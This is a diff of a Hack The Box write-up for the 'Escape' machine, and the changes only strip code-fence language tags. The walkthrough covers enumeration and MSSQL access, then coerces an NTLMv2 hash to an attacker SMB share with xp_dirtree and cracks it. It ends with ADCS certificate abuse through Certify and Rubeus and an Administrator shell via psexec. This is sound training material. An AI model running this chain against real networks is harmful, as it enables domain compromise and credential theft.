@@ -12,7 +12,7 @@ First let's start with the nmap.
 
 As with every machine, let's start with a Nmap scan. I use my own Rust wrapper which you can find [here](https://github.com/frostvandrer/rustmap). It was my first Rust project and it's very simple and not optimized, but it gets the job done. Let's look at the results.
 
-```bsah
+```
 # Nmap 7.93 scan initiated Sun Apr 16 12:25:51 2023 as: nmap -sC -sV -oA nmap/escape -p 53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49687,49688,49704,49712,49714 10.10.11.202
 Nmap scan report for 10.10.11.202
 Host is up (0.11s latency).
@@ -99,7 +99,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 We are dealing with a Windows 10 machine. Since we can see port 88 open as well as LDAP ports open, we can assume we are dealing with the domain controller. We can see the domain names as `sequel.htb` and `dc.sequel.htb`. Let's add those to our `/etc/hosts` file.
 
-```bash
+```
 printf "%s\t%s\n\n" "10.10.11.202" "sequel.htb dc.sequel.htb" | sudo tee -a /etc/hosts
 ```
 
@@ -107,7 +107,7 @@ printf "%s\t%s\n\n" "10.10.11.202" "sequel.htb dc.sequel.htb" | sudo tee -a /etc
 
 Let's start with LDAP. We can try lo login without any credentials, sometimes you're lucky and it works. Unfortunatelly, in this case it does not work and we need credentials.
 
-```bash
+```
 ➜  Escape ldapsearch -x -H ldap://10.10.11.202 -s sub -b 'DC=sequel,DC=htb'     
 # extended LDIF
 #
@@ -130,7 +130,7 @@ text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 
 Since there is no web server running on the box we can proceed with enumerating `SMB`. We can user `crackmapexec` to look at the shares.
 
-```bash
+```
 ➜  Escape crackmapexec smb 10.10.11.202 -u 'guest' -p '' --shares
 SMB         10.10.11.202    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
 SMB         10.10.11.202    445    DC               [+] sequel.htb\guest:
@@ -147,7 +147,7 @@ SMB         10.10.11.202    445    DC               SYSVOL                      
 
 Looks like we have a `READ` access to the `Public` share. We can use `smbclient` to take a look at the files.
 
-```bash
+```
 ➜  Escape smbclient \\\\10.10.11.202\\Public
 Password for [WORKGROUP\qurius]:
 Try "help" to get a list of possible commands.
@@ -161,7 +161,7 @@ smb: \> dir
 
 It looks like the only file inside the share is `SQL Server Procedures.pdf`. This might be interesting since we saw that the `Microsoft SQL Server 2019` is running on the box on port 1433. Let's take a closer look at the PDF.
 
-```bash
+```
 smb: \> get "SQL Server Procedures.pdf" 
 getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (77.9 KiloBytes/sec) (average 77.9 KiloBytes/sec)
 smb: \> exit
@@ -169,7 +169,7 @@ smb: \> exit
 
 First let's use `exiftool` to check the metadata of the PDF to hunt for possible usernames or to see what was used to generate the PDF.
 
-```bash
+```
 ➜  Escape exiftool "SQL Server Procedures.pdf"
 ExifTool Version Number         : 12.57
 File Name                       : SQL Server Procedures.pdf
@@ -201,7 +201,7 @@ Well, it looks like there is just a "mock" instance of the database on the DC an
 
 We can use `Impacket MSSQL Client` to connect to the database.
 
-```bash
+```
 ➜  Escape python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py sequel/PublicUser:GuestUserCantWrite1@sequel.htb
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
@@ -217,7 +217,7 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
 Let's take look at the database's structure. Since it's just a "mock" instance we do not expect any useful data here, but it's still worth to check.
 
-```bash
+```
 SQL> SELECT name FROM master.sys.databases;
 name
 
@@ -242,13 +242,13 @@ What we can do now is to try to steal a `NTLMv2` hash. Since we can execute SQL 
 
 We can user following command to try to fetch the remote content.
 
-```sql
+```
 exec master.dbo.xp_dirtree '\\10.10.14.88\smb'
 ```
 
 We can see that it indeed worked and we successfuly captured the `NTLMv2` hash:
 
-```bash
+```
 ➜  Escape python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support smb .
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
@@ -268,7 +268,7 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
 We can now hop to my host OS and use `hashcat` to crack the `NTLMv2` hash.
 
-```powershell
+```
 PS C:\Tools\Hashcat> .\hashcat.exe .\sql_svc.hash ..\Wordlists\rockyou.txt
 .
 .
@@ -282,7 +282,7 @@ We have now a new set of credentials: `sql_svc:REGGIE1234ronnie`.
 
 Since we saw `WINRM` ports open we can confirm that we can login as user `sql_svc` via `WINRM` in crackmapexec.
 
-```bash
+```
 ➜  Escape crackmapexec winrm sequel.htb -u 'sql_svc' -p 'REGGIE1234ronnie' 
 SMB         sequel.htb      5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:sequel.htb)
 HTTP        sequel.htb      5985   DC               [*] http://sequel.htb:5985/wsman
@@ -293,7 +293,7 @@ WINRM       sequel.htb      5985   DC               [+] sequel.htb\sql_svc:REGGI
 
 We confirmed that we indeed can log in via `WINRM` as user `sql_svc`. Let's use `evil-winrm` to get a shell.
 
-```bash
+```
 ➜  Escape evil-winrm -i sequel.htb -u sql_svc -p REGGIE1234ronnie
 
 Evil-WinRM shell v3.5
@@ -308,7 +308,7 @@ Info: Establishing connection to remote endpoint
 
 We still do not have access to `user.txt` flag so let's enumerate the filesystem.
 
-```powershell
+```
 *Evil-WinRM* PS C:\> ls
 
 
@@ -331,7 +331,7 @@ d-----         2/6/2023   7:21 AM                Windows
 
 We can see that there is `SQLServer` directory in `C:\`, which kind of pops to our eyes. Let's take a look inside.
 
-```powershell
+```
 *Evil-WinRM* PS C:\SQLServer> ls
 
 
@@ -348,7 +348,7 @@ d-----       11/18/2022   1:37 PM                SQLEXPR_2019
 
 We have a couple of binaries, config files and logs. I think logs might be a good place to look.
 
-```powershell
+```
 *Evil-WinRM* PS C:\SQLServer\Logs> cat ERRORLOG.BAK
 2022-11-18 13:43:05.96 Server      Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
         Sep 24 2019 13:48:23
@@ -398,7 +398,7 @@ We can see a failed login attempt from `sequel.htb\Ryan.Cooper`. He tired again 
 
 Let's see if we can login.
 
-```powershell
+```
 ➜  Escape evil-winrm -i sequel.htb -u Ryan.Cooper -p NuclearMosquito3
 
 Evil-WinRM shell v3.5
@@ -421,7 +421,7 @@ We indeed can and now we can finally read the `user.txt` flag.
 
 Enumerating the filesystem did not show anything interesting straight away so I decided to upload and run `WinPEAS`.
 
-```powershell
+```
 *Evil-WinRM* PS C:\programdata> upload /home/qurius/htb/boxes/medium/owned/Escape/winpeas.exe
    
 Info: Uploading /home/qurius/htb/boxes/medium/owned/Escape/winpeas.exe to C:\programdata\winpeas.exe
@@ -487,7 +487,7 @@ Info: Upload successful!
 
 We can dowload [Certify](https://github.com/GhostPack/Certify) to our Windows VM and compile it from source, then upload it to the target machine.
 
-```powershell
+```
 *Evil-WinRM* PS C:\programdata> .\certify.exe find /vulnerable
 
    _____          _   _  __
@@ -552,13 +552,13 @@ What we can do is request a certificate for the `Administrator` user which we ca
 
 #### Step 1 - Request the Administrator certificate
 
-```powershell
+```
 .\certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator
 ```
 
 We can see that we successfully obtained the certificate:
 
-```powershell
+```
 *Evil-WinRM* PS C:\programdata> .\certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator
 
    _____          _   _  __
@@ -611,13 +611,13 @@ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provid
 
 We now have a certificate to authenticate as `Administrator`. What we can do now, is to issue ourselves a `Ticket Granting Ticket` (TGT). We can do this with [Rubeus](https://github.com/GhostPack/Rubeus). We again download and compile from source in our Windows VM and upload it to the box.
 
-```powershell
+```
 .\Rubeus.exe asktgt /user:Administrator /certificate:C:\programdata\cert.pfx
 ```
 
 We upload the `cert.pfx` and `Rubeus.exe` onto the target machine and run the above command.
 
-```powershell
+```
 *Evil-WinRM* PS C:\programdata> upload /home/qurius/htb/boxes/medium/owned/Escape/cert.pfx
 
 Info: Uploading /home/qurius/htb/boxes/medium/owned/Escape/cert.pfx to C:\programdata\cert.pfx
@@ -694,7 +694,7 @@ Success! We now have a TGT as `Administrator`. This is of course in `kirbi` form
 
 #### Step 4 - Transform the Ticket From KIRBI to CCACHE format
 
-```bash
+```
 ➜  Escape cat ticket.kirbi.b64 | base64 -d > ticket.kirbi
 ➜  Escape python3 ticketConverter.py ticket.kirbi ticket.ccache
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
@@ -708,7 +708,7 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
 Looks like we have everything we need. Let's use Impacket `psexec.py` to get a shell as `Administrator`.
 
-```bash
+```
 ➜  Escape KRB5CCNAME=ticket.ccache python3 /usr/share/doc/python3-impacket/examples/psexec.py -k -no-pass -dc-ip 10.10.11.202 sequel.htb/administrator@dc.sequel.htb
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
@@ -717,14 +717,14 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
 Oops! We get a error. We don't have to worry since this was expected. Since we are dealing with active directory, time is a very sensitive issue for the DC. We have to sync our time with the DC. We can use following command to do so.
 
-```bash
+```
 ➜  Escape sudo ntpdate dc.sequel.htb
 2023-06-16 19:45:29.147201 (+0200) -0.000088 +/- 0.018286 dc.sequel.htb 10.10.11.202 s1 no-leap
 ```
 
 We can now re-run the `psexec.py` command and get a shell as `Administrator`.
 
-```bash
+```
 ➜  Escape KRB5CCNAME=ticket.ccache python3 /usr/share/doc/python3-impacket/examples/psexec.py -k -no-pass -dc-ip 10.10.11.202 sequel.htb/administrator@dc.sequel.htb
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
